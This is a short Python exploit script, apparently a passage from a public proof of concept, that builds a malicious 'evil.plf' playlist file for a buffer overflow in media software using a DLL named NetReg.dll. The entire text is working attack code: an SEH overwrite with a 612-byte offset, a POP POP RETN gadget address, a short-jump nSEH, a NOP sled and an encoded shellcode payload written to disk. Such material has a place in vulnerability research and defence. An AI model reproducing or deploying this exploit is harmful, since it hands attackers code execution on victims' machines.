SEH = POP POP RETN
nSEH = jmp 6 bytes to D's = \xEB\x06\x90\x90"


filename="evil.plf"


#offset 612
#0x64104517 : pop esi # pop edi # ret  | ascii {PAGE_EXECUTE_READ} [NetReg.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False,


shellcode = (
"\xdd\xc4\xd9\x74\x24\xf4\xba\xa3\xd6\xe6\xd0\x5e\x31\xc9\xb1"
"\x54\x31\x56\x18\x03\x56\x18\x83\xee\x5f\x34\x13\x2c\x77\x3b"
"\xdc\xcd\x87\x5c\x54\x28\xb6\x5c\x02\x38\xe8\x6c\x40\x6c\x04"
"\x06\x04\x85\x9f\x6a\x81\xaa\x28\xc0\xf7\x85\xa9\x79\xcb\x84"
"\x29\x80\x18\x67\x10\x4b\x6d\x66\x55\xb6\x9c\x3a\x0e\xbc\x33"
"\xab\x3b\x88\x8f\x40\x77\x1c\x88\xb5\xcf\x1f\xb9\x6b\x44\x46"
"\x19\x8d\x89\xf2\x10\x95\xce\x3f\xea\x2e\x24\xcb\xed\xe6\x75"
"\x34\x41\xc7\xba\xc7\x9b\x0f\x7c\x38\xee\x79\x7f\xc5\xe9\xbd"
"\x02\x11\x7f\x26\xa4\xd2\x27\x82\x55\x36\xb1\x41\x59\xf3\xb5"
"\x0e\x7d\x02\x19\x25\x79\x8f\x9c\xea\x08\xcb\xba\x2e\x51\x8f"
"\xa3\x77\x3f\x7e\xdb\x68\xe0\xdf\x79\xe2\x0c\x0b\xf0\xa9\x58"
"\xf8\x39\x52\x98\x96\x4a\x21\xaa\x39\xe1\xad\x86\xb2\x2f\x29"
"\xe9\xe8\x88\xa5\x14\x13\xe9\xec\xd2\x47\xb9\x86\xf3\xe7\x52"
"\x57\xfc\x3d\xce\x52\x6a\x12\x10\x5c\x05\x02\x2d\x5e\xc8\x8e"
"\xb8\xb8\xba\x7e\xeb\x14\x7a\x2f\x4b\xc5\x12\x25\x44\x3a\x02"
"\x46\x8e\x53\xa8\xa9\x67\x0b\x44\x53\x22\xc7\xf5\x9c\xf8\xad"
"\x35\x16\x09\x51\xfb\xdf\x78\x41\xeb\x81\x82\x99\xeb\x2b\x83"
"\xf3\xef\xfd\xd4\x6b\xed\xd8\x13\x34\x0e\x0f\x20\x33\xf0\xce"
"\x11\x4f\xc6\x44\x1e\x27\x26\x89\x9e\xb7\x70\xc3\x9e\xdf\x24"
"\xb7\xcc\xfa\x2b\x62\x61\x57\xb9\x8d\xd0\x0b\x6a\xe6\xde\x72"
"\x5c\xa9\x21\x51\xdf\xae\xde\x27\xfd\x16\xb7\xd7\x41\xa7\x47"
"\xb2\x41\xf7\x2f\x49\x6e\xf8\x9f\xb2\xa5\x51\x88\x39\x2b\x13"
"\x29\x3d\x66\xf5\xf7\x3e\x84\x2e\xe1\xb0\x6b\xd1\x0e\x33\x50"
"\x07\x37\x41\x91\x9b\x0c\x5a\xa8\xbe\x25\xf1\xd2\xed\x36\xd0")



nseh = "\xEB\x06\x90\x90"
seh = "\x17\x45\x10\x64"
nops = "\x90"*20
buffer = "A"*608 + nseh + seh + nops+ shellcode + "D"*(1384-len(shellcode+nops))


textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()

